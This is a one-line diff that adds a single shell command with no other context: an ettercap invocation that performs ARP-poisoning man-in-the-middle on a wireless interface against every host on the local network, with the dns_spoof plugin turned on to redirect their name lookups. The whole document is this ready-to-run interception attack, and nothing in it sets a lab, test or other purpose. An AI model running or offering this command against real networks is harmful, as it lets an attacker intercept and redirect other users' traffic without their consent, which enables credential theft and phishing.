@@ -1,0 +1,1 @@
+ettercap -T -q -M arp -i wlan0 -P dns_spoof ///
